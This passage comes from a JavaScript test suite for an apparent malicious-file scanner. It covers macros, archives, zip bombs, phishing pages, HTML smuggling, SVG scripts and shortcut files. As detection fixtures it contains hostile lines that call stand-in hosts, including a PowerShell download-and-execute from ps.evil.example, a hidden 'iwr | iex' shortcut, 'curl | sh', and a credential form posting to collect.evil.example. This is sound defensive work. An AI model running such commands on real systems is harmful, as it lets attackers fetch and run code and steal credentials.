  const shifted = Buffer.concat([ole(['Root Entry']), Buffer.alloc(2), Buffer.from('VBA\0', 'utf16le'), Buffer.alloc(200)]);
  shifted.writeUInt16LE(8, 512 + 512 + 2 + 64);
  noFinding(analyze('a.doc', shifted), 'macros');
});

test('ole: ObjectPool and Ole10Native are embedded objects', () => {
  assert.equal(detail(analyze('a.doc', ole(['Root Entry', 'ObjectPool'])), 'ole_object'), 'ObjectPool');
  assert.equal(detail(analyze('a.doc', ole(['Root Entry', '\u0001Ole10Native'])), 'ole_object'), 'Ole10Native');
  noFinding(analyze('a.doc', ole(['Root Entry', 'WordDocument'])), 'ole_object');
});

test('rtf: an embedded object', () => {
  hasFinding(analyze('a.rtf', '{\\rtf1{\\object\\objemb{\\*\\objdata 0105000002000000}}}'), 'ole_object');
  noFinding(analyze('a.rtf', '{\\rtf1 the word objdata}'), 'ole_object');
});

// ---- archives ------------------------------------------------------------------------------------------------------

test('zip: an executable inside, a nested archive, encrypted entries, the listing', () => {
  const r = analyze('docs.zip', zip([
    { name: 'docs/', data: '' },
    { name: 'docs/invoice.pdf.exe', data: pe() },
    { name: 'docs/more.rar', data: 'x' },
    { name: 'secret.txt', data: 'x', flags: 0x801 },
  ]));
  assert.equal(r.file_type, 'zip');
  assert.equal(detail(r, 'archive_executable'), 'docs/invoice.pdf.exe');
  assert.equal(detail(r, 'nested_archive'), 'docs/more.rar');
  assert.equal(detail(r, 'archive_encrypted'), 'secret.txt');
  assert.deepEqual(r.entries, ['docs/', 'docs/invoice.pdf.exe', 'docs/more.rar', 'secret.txt']);
  assert.equal(r.entries_total, 4);
  assert.equal(r.truncated, false);
  const plain = analyze('docs.zip', zip([{ name: 'a.pdf', data: 'x' }, { name: 'tools.exe/', data: '' }]));
  assert.deepEqual(plain.findings, []);
});

test('zip: the listing is capped; the total is still counted', () => {
  const r = analyze('many.zip', zip(Array.from({ length: 45 }, (_, i) => ({ name: `f${i}-${'n'.repeat(300)}.txt`, data: 'x', method: 0 }))));
  assert.equal(r.entries.length, FILE_LIMITS.entries);
  assert.equal(r.entries_total, 45);
  assert.ok(r.entries.every((e) => e.length <= FILE_LIMITS.entryNameChars));
  assert.equal(r.truncated, true);
});

test('zip: without a central directory the local headers are read; corrupt and truncated zips do not throw', () => {
  const entries = [{ name: 'a.txt', data: 'hello' }, { name: 'run.vbs', data: 'x' }];
  const noCd = analyze('a.zip', zip(entries, { central: false }));
  assert.deepEqual(noCd.entries, ['a.txt', 'run.vbs']);
  hasFinding(noCd, 'archive_executable');
  const whole = zip(entries);
  for (let n = 0; n <= whole.length; n += 3) analyze('a.zip', whole.subarray(0, n));
  const r = analyze('a.zip', Buffer.concat([Buffer.from('PK\x03\x04'), Buffer.alloc(200, 0xff)]));
  assert.equal(r.file_type, 'zip');
});

test('zip: a self-extractor stub in front of the archive still lists it', () => {
  const r = analyze('a.zip', Buffer.concat([Buffer.from('PK\x03\x04' + 'X'.repeat(96), 'latin1'), zip([{ name: 'payload.scr', data: 'x' }])]));
  hasFinding(r, 'archive_executable');
});

test('zip bombs: a claimed size over the cap is not inflated; a lying size hits maxOutputLength; the total is bounded', () => {
  const claim = analyze('a.docx', docx({ name: 'word/document.xml', data: '<w:instrText>DDEAUTO x</w:instrText>', usize: 0xfffffff0 }));
  noFinding(claim, 'dde');
  assert.equal(claim.truncated, true);
  const big = deflateRawSync(Buffer.alloc(FILE_LIMITS.entryInflateBytes * 2, 0x20));
  const lie = analyze('a.docx', docx({ name: 'word/document.xml', body: big, data: 'x', usize: 10 }));
  assert.equal(lie.truncated, true);
  // many bombs: each failed one is charged in full to the shared budget, so after a few nothing more is inflated (a
  // part behind them is not read); uncharged, all of them would be inflated to the entry cap
  const template = { name: 'word/_rels/settings.xml.rels', data: rels(`<Relationship Id="r" Type="${REL}/attachedTemplate" Target="https://late.example/t" TargetMode="External"/>`) };
  const bombs = docx(...Array.from({ length: 250 }, (_, i) => ({ name: `word/_rels/p${i}.rels`, body: big, data: 'x', usize: 10 })), template);
  const t0 = Date.now();
  const many = analyze('a.docx', bombs);
  const ms = Date.now() - t0;
  assert.equal(many.truncated, true);
  noFinding(many, 'external_template');
  assert.ok(ms < 5000, `took ${ms} ms`);
  hasFinding(analyze('a.docx', docx(...Array.from({ length: 3 }, (_, i) => ({ name: `word/_rels/p${i}.rels`, body: big, data: 'x', usize: 10 })), template)), 'external_template');
});

test('rar: listing, executables and encryption in RAR 4 and RAR 5', () => {
  for (const make of [rar4, rar5]) {
    const r = analyze('a.rar', make([{ name: 'invoice.pdf.exe' }, { name: 'notes.txt', encrypted: true }]));
    assert.equal(r.file_type, 'rar');
    assert.deepEqual(r.entries, ['invoice.pdf.exe', 'notes.txt'], make.name);
    assert.equal(detail(r, 'archive_executable'), 'invoice.pdf.exe', make.name);
    assert.equal(detail(r, 'archive_encrypted'), 'notes.txt', make.name);
    assert.equal(detail(analyze('a.rar', make([], { encryptedHeaders: true })), 'archive_encrypted'), 'headers', make.name);
    const whole = make([{ name: 'a.txt' }, { name: 'b.lnk' }]);
    for (let n = 0; n <= whole.length; n++) analyze('a.rar', whole.subarray(0, n));
  }
});

test('7z: an AES coder in the header is encryption', () => {
  hasFinding(analyze('a.7z', sevenZip(Buffer.from([0x01, 0x04, 0x06, 0x00, 0x24, 0x06, 0xf1, 0x07, 0x01]))), 'archive_encrypted');
  noFinding(analyze('a.7z', sevenZip(Buffer.from([0x01, 0x04, 0x06, 0x00, 0x21, 0x03, 0x01, 0x01]))), 'archive_encrypted');
});

test('gzip: the stored name, an executable or archive inside, a tar listing', () => {
  const exe = analyze('a.gz', gzipNamed('invoice.exe', pe()));
  assert.deepEqual(exe.entries, ['invoice.exe']);
  assert.equal(detail(exe, 'archive_executable'), 'invoice.exe');
  const byContent = analyze('a.gz', gzipSync(pe()));
  assert.equal(detail(byContent, 'archive_executable'), 'pe');
  assert.equal(detail(analyze('a.gz', gzipSync(zip([{ name: 'x', data: 'y' }]))), 'nested_archive'), 'zip');
  const tgz = analyze('a.tgz', gzipSync(tar(['docs/readme.txt', 'docs/run.sh'])));
  assert.deepEqual(tgz.entries, ['docs/readme.txt', 'docs/run.sh']);
  assert.equal(detail(tgz, 'archive_executable'), 'docs/run.sh');
  const longName = `${'deep/'.repeat(30)}invoice.pdf.exe`;
  assert.deepEqual(analyze('a.tar', tar([longName])).entries, [longName.slice(0, FILE_LIMITS.entryNameChars)]);
  const plainTar = analyze('a.tar', tar(['a.iso']));
  assert.deepEqual(plainTar.entries, ['a.iso']);
  hasFinding(plainTar, 'archive_executable');
  // a gzip bomb: what its head inflates to is still read
  const bomb = analyze('a.tgz', gzipSync(Buffer.concat([tar(['x.lnk']).subarray(0, 1024), Buffer.alloc(40 * 1024 * 1024)])));
  assert.equal(bomb.truncated, true);
  assert.deepEqual(bomb.entries, ['x.lnk']);
});

test('iso: a disk image, its root listing, executables in it', () => {
  noFinding(analyze('a.iso', iso(['README.TXT', 'SETUP.EXE/'])), 'archive_executable');
  const r = analyze('a.iso', iso(['INVOICE.LNK', 'DATA.DLL', 'DOCS/']));
  assert.equal(r.file_type, 'iso');
  assert.equal(detail(r, 'disk_image'), 'iso9660');
  assert.deepEqual(r.entries, ['INVOICE.LNK', 'DATA.DLL', 'DOCS']);
  assert.equal(detail(r, 'archive_executable'), 'INVOICE.LNK');
  const long = analyze('a.iso', iso(['Invoice 2026-11 (final).pdf.lnk', 'payload.dll'], { joliet: true }));
  assert.deepEqual(long.entries, ['Invoice 2026-11 (final).pdf.lnk', 'payload.dll']);
  assert.equal(detail(long, 'archive_executable'), 'Invoice 2026-11 (final).pdf.lnk');
  assert.equal(detail(analyze('a.vhd', Buffer.concat([Buffer.from('conectix'), Buffer.alloc(600)])), 'disk_image'), 'vhd');
  const whole = iso(['A.EXE']);
  for (const n of [0x8000, 0x8010, 20 * 2048 + 10, whole.length - 1]) analyze('a.iso', whole.subarray(0, n));
});

// ---- html and svg --------------------------------------------------------------------------------------------------

test('html: a phishing page with a password form posting to another host', () => {
  const r = analyze('login.html', PHISH_HTML, 'text/html');
  assert.equal(r.file_type, 'html');
  assert.equal(r.html.title, 'Sign in & verify');
  assert.deepEqual(r.html.forms, [{ action: 'https://collect.evil.example/p.php', password: true }, { action: '/local', password: false }]);
  assert.equal(detail(r, 'html_form_elsewhere'), 'collect.evil.example');
  hasFinding(r, 'html_password_form');
  assert.deepEqual(r.links, ['https://collect.evil.example/p.php', 'https://login.microsoftonline.com.evil.example/', 'https://cdn.evil.example/logo.png']);
});

test('html: a password field outside any form counts; a local form is not elsewhere', () => {
  const r = analyze('a.html', '<html><body><div><input type="password" id="p"></div><form action="/x"></form></body></html>');
  assert.equal(detail(r, 'html_password_form'), 'outside a form');
  noFinding(r, 'html_form_elsewhere');
  noFinding(analyze('a.html', '<html><body><input type="text"></body></html>'), 'html_password_form');
  const after = analyze('a.html', '<html><form action="/a"></form><input type=password></html>');
  assert.equal(detail(after, 'html_password_form'), 'outside a form');
  assert.deepEqual(after.html.forms, [{ action: '/a', password: false }]);
  // an entity-encoded action is decoded
  assert.equal(detail(analyze('a.html', '<html><form action="https&#58;//enc.example/p"></form></html>'), 'html_form_elsewhere'), 'enc.example');
});

test('html: obfuscated scripts', () => {
  const b64 = analyze('a.html', `<html><script>var s = "${LONG_B64}"; eval(atob(s));</script></html>`);
  assert.equal(detail(b64, 'html_obfuscated_script'), 'eval');
  assert.equal(detail(analyze('a.html', `<html><script>var s = "${LONG_B64}"; atob(s);</script></html>`), 'html_obfuscated_script'), 'atob');
  hasFinding(analyze('a.html', `<html><script>document.write(unescape("${'%3C%61'.repeat(40)}"))</script></html>`), 'html_obfuscated_script');
  hasFinding(analyze('a.html', `<html><script>x("${'\\x41'.repeat(60)}"); eval(x)</script></html>`), 'html_obfuscated_script');
  hasFinding(analyze('a.html', `<html><script>x("${'\\u0041'.repeat(60)}"); eval(x)</script></html>`), 'html_obfuscated_script');
  hasFinding(analyze('a.html', `<html><script>String.fromCharCode(${Array.from({ length: 40 }, (_, i) => 60 + i).join(',')})</script></html>`), 'html_obfuscated_script');
  // a long blob without a decoder, or a decoder without a blob, is not obfuscation; nor a blob outside scripts
  noFinding(analyze('a.html', `<html><script>var s = "${LONG_B64}";</script></html>`), 'html_obfuscated_script');
  noFinding(analyze('a.html', '<html><script>eval("1+1")</script></html>'), 'html_obfuscated_script');
  noFinding(analyze('a.html', `<html><script>eval("1")</script><img src="data:image/png;base64,${LONG_B64}"></html>`), 'html_obfuscated_script');
  noFinding(analyze('a.html', `<html><script>eval("1")</script><p>${LONG_B64}</p></html>`), 'html_obfuscated_script');
});

test('html: redirects by meta refresh and by script', () => {
  const meta = analyze('a.html', '<html><head><meta http-equiv="Refresh" content="0; url=https://next.evil.example/x"></head></html>');
  assert.equal(detail(meta, 'html_redirect'), 'next.evil.example');
  assert.deepEqual(meta.links, ['https://next.evil.example/x']);
  assert.equal(detail(analyze('a.html', '<html><script>window.location.href = "https://js.example/a";</script></html>'), 'html_redirect'), 'js.example');
  assert.equal(detail(analyze('a.html', "<html><script>location.replace('https://rep.example/')</script></html>"), 'html_redirect'), 'rep.example');
  assert.equal(detail(analyze('a.html', '<html><body onload="location=\'https://onload.example/\'"></body></html>'), 'html_redirect'), 'onload.example');
  noFinding(analyze('a.html', '<html><head><meta http-equiv="refresh" content="30"></head><script>location.href="/local"</script></html>'), 'html_redirect');
});

test('html: smuggling by Blob, createObjectURL and a download', () => {
  const page = '<html><script>const b = new Blob([bytes], {type: "application/octet-stream"}); const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "invoice.iso"; a.click();</script></html>';
  hasFinding(analyze('a.html', page), 'html_smuggling');
  hasFinding(analyze('a.html', page.replace('a.download = "invoice.iso"', 'navigator.msSaveOrOpenBlob(b)')), 'html_smuggling');
  noFinding(analyze('a.html', page.replace('a.download = "invoice.iso";', '')), 'html_smuggling');
  noFinding(analyze('a.html', page.replace('URL.createObjectURL(b)', '"#"')), 'html_smuggling');
  noFinding(analyze('a.html', page.replace('new Blob(', 'new Thing(')), 'html_smuggling');
});

test('html: addresses in scripts are links (where a page sends what it collects)', () => {
  const r = analyze('a.html', '<html><script>fetch("https://api.telegram.org/bot123/sendMessage", {method: "POST"})</script></html>');
  assert.deepEqual(r.links, ['https://api.telegram.org/bot123/sendMessage']);
});

test('html: comments are skipped; script bodies are not parsed as tags', () => {
  const r = analyze('a.html', '<html><!-- a > b <form action="https://c.example/"> --><script>if (a<b) { s = "<input type=password>"; }</script></html>');
  noFinding(r, 'html_form_elsewhere');
  noFinding(r, 'html_password_form');
});

test('hta: a script file analysed as a page too, without an html field', () => {
  const r = analyze('update.hta', `<html><script>eval(atob("${LONG_B64}"))</script><form action="https://h.example/"><input type=password></form></html>`);
  assert.equal(r.file_type, 'script');
  hasFinding(r, 'script_file');
  hasFinding(r, 'html_obfuscated_script');
  hasFinding(r, 'html_password_form');
  assert.equal(r.html, undefined);
});

test('svg: scripts, event handlers and javascript: links', () => {
  const head = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">';
  const s1 = analyze('a.svg', `${head}<title>Fax</title><script>window.location='https://svg.evil.example/'</script></svg>`);
  assert.equal(s1.file_type, 'svg');
  assert.equal(detail(s1, 'svg_script'), 'script');
  assert.equal(s1.html.title, 'Fax');
  hasFinding(s1, 'html_redirect');
  assert.equal(detail(analyze('a.svg', `${head}<rect onclick="go()"/></svg>`), 'svg_script'), 'onclick');
  assert.equal(detail(analyze('a.svg', `${head}<a xlink:href="javascript:go()"><text>x</text></a></svg>`), 'svg_script'), 'javascript: link');
  const clean = analyze('a.svg', `${head}<a xlink:href="https://ok.example/"><rect opacity="1"/></a></svg>`);
  assert.deepEqual(clean.findings, []);
  assert.deepEqual(clean.links, ['https://ok.example/']);
  // in a page an event handler is not svg_script
  noFinding(analyze('a.html', '<html><body onload="x()"></body></html>'), 'svg_script');
});

// ---- executables, scripts, shortcuts, text -------------------------------------------------------------------------

test('executables: PE, DLL, ELF, Mach-O', () => {
  assert.equal(detail(analyze('a.exe', pe()), 'executable'), 'PE32 executable');
  assert.equal(detail(analyze('a.dll', pe({ dll: true, plus: true })), 'executable'), 'PE32+ DLL');
  assert.equal(detail(analyze('a.exe', Buffer.from('MZ\0\0')), 'executable'), 'DOS executable');
  assert.equal(detail(analyze('a', Buffer.from('\x7fELF\x02\x01\x01\0', 'latin1')), 'executable'), 'ELF 64-bit');
  assert.equal(detail(analyze('a', Buffer.from('cffaedfe07000001', 'hex')), 'executable'), 'Mach-O');
});

test('scripts: script_file by extension or shebang, links in the text', () => {
  const r = analyze('run.ps1', 'IEX (New-Object Net.WebClient).DownloadString("https://ps.evil.example/a.ps1"); # see https://ps.evil.example/a.ps1.');
  assert.equal(detail(r, 'script_file'), 'ps1');
  assert.deepEqual(r.links, ['https://ps.evil.example/a.ps1']);
  assert.equal(detail(analyze('install', '#!/bin/bash\ncurl x | sh'), 'script_file'), 'shebang');
  noFinding(analyze('notes.txt', 'echo hi'), 'script_file');
});

test('shortcut: the command it runs and the address in it', () => {
  const r = analyze('invoice.pdf.lnk', lnk('..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-w hidden -c iwr https://stage.evil.example/p.ps1|iex'));
  assert.equal(r.file_type, 'lnk');
  assert.match(detail(r, 'shortcut'), /powershell\.exe -w hidden/);
  assert.deepEqual(r.links, ['https://stage.evil.example/p.ps1']);
  assert.equal(r.double_extension, true);
  hasFinding(analyze('a.lnk', lnk('x', '').subarray(0, 0x4c)), 'shortcut');
});

test('text: links are deduplicated, cut of trailing punctuation, capped at 20', () => {
  const r = analyze('a.txt', 'see https://a.example/x, and (https://b.example/y). Again https://a.example/x! ftp://no.example/ and http://c.example/"q"');
  assert.deepEqual(r.links, ['https://a.example/x', 'https://b.example/y', 'http://c.example/']);
  const many = analyze('a.txt', Array.from({ length: 30 }, (_, i) => `https://h${i}.example/`).join(' '));
  assert.equal(many.links.length, FILE_LIMITS.links);
  assert.equal(many.truncated, true);
  const long = analyze('a.txt', `https://long.example/${'a'.repeat(5000)}`);
  assert.ok(long.links[0].length <= FILE_LIMITS.urlChars);
});

// ---- robustness ----------------------------------------------------------------------------------------------------

test('never throws: odd input, every fixture cut at many lengths, random bytes behind every magic', () => {
  assert.equal(analyzeFile().bytes, 0);
  assert.equal(analyzeFile({ name: 5, mime: {}, data: 'not a buffer' }).file_type, 'other');
  assert.equal(analyzeFile({ name: 'a', mime: 'x', data: new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d]) }).file_type, 'pdf');
  const fixtures = [pdf(flateObject(2, '/URI (https://x.example/)')), docx({ name: 'word/vbaProject.bin', data: ovbaLiteral(VBA_SOURCE) }), ole(['_VBA_PROJECT']),
    rar4([{ name: 'a' }]), rar5([{ name: 'a' }]), gzipNamed('a.exe', 'x'), lnk('a', 'b'), Buffer.from(PHISH_HTML), sevenZip(Buffer.from([1, 2]))];
  let seed = 1;
  const rnd = () => { seed = (seed * 1103515245 + 12345) >>> 0; return seed >>> 24; };
  for (const f of fixtures) {
    for (let n = 0; n < f.length; n += Math.max(1, Math.floor(f.length / 60))) {
      const r = analyzeFile({ name: 'x', mime: 'y', data: f.subarray(0, n) });
      assert.equal(typeof r.sha256, 'string');
    }
    for (let k = 0; k < 20; k++) {
      const noisy = Buffer.from(f);
      for (let j = 8; j < noisy.length; j += 1 + (rnd() % 16)) noisy[j] = rnd();
      analyzeFile({ name: 'x.docx', mime: 'y', data: noisy });
    }
  }
});

test('bounded: adversarial 16 MiB inputs finish quickly', () => {
  const big = 16 * 1024 * 1024;
  const cases = [
    ['a.html', Buffer.from('<html>' + '<form'.repeat(big / 5))],
    ['a.html', Buffer.from('<html>' + '<'.repeat(big))],
    ['a.html', Buffer.from('<html><a ' + 'x="'.repeat(big / 3))],
    ['a.html', Buffer.from(`<html><script>eval(1);${'A'.repeat(199)} `.repeat(big / 220))],
    ['a.html', Buffer.from('<html><script>' + '%41'.repeat(49).concat('-').repeat(big / 150))],
    ['a.pdf', Buffer.from('%PDF-1.4\n' + '/a'.repeat(big / 2))],
    ['a.pdf', Buffer.from('%PDF-1.4\n' + '/URI ('.repeat(big / 6))],
    ['a.pdf', Buffer.from('%PDF-1.4\n' + '/URI <'.repeat(big / 6))],
    ['a.pdf', Buffer.from('%PDF-1.4\n' + '/FlateDecode stream\n'.repeat(big / 20))],
    ['a.pdf', Buffer.from('%PDF-1.4\n' + '/FlateDecode stream\r\nxendstream '.repeat(big / 34))],
    ['a.doc', ole(['_VBA_PROJECT'], Buffer.concat(Array.from({ length: 300 }, () => Buffer.concat([ovbaLiteral('Attribute VB_Name'.padEnd(4000, 'z')), Buffer.alloc(50000, 0xb0)]))))],
    ['a.txt', Buffer.from('https://'.repeat(big / 8))],
    ['a.zip', Buffer.from('PK\x03\x04'.repeat(big / 4), 'latin1')],
    ['a.docx', Buffer.concat([zip([CONTENT_TYPES, { name: 'word/document.xml', data: '<w:instrText'.repeat(big / 24) }])])],
  ];
  for (const [name, data] of cases) {
    const t0 = Date.now();
    const r = analyzeFile({ name, mime: 'x', data });
    const ms = Date.now() - t0;
    assert.ok(ms < 8000, `${name} ${data.subarray(0, 20).toString('latin1')}: ${ms} ms`);
    assert.ok(JSON.stringify(r).length < 120 * 1024);
  }
});

test('the event stays small even when every cap is reached', () => {
  const links = Array.from({ length: 40 }, (_, i) => `<a href="https://h${i}.example/${'p'.repeat(3000)}">x</a>`).join('');
  const forms = Array.from({ length: 15 }, () => `<form action="https://f.example/${'q'.repeat(3000)}"><input type=password></form>`).join('');
  const r = analyze('a.html', `<html><head><title>${'t'.repeat(5000)}</title></head>${links}${forms}</html>`);
  assert.equal(r.links.length, FILE_LIMITS.links);
  assert.equal(r.html.forms.length, FILE_LIMITS.forms);
  assert.equal(r.html.title.length, FILE_LIMITS.titleChars);
  assert.ok(r.html.forms.every((f) => f.action.length <= FILE_LIMITS.urlChars));
  assert.ok(r.findings.every((f) => f.detail.length <= FILE_LIMITS.detailChars));
  assert.ok(JSON.stringify(r).length < 100 * 1024);
  assert.equal(r.truncated, true);
});
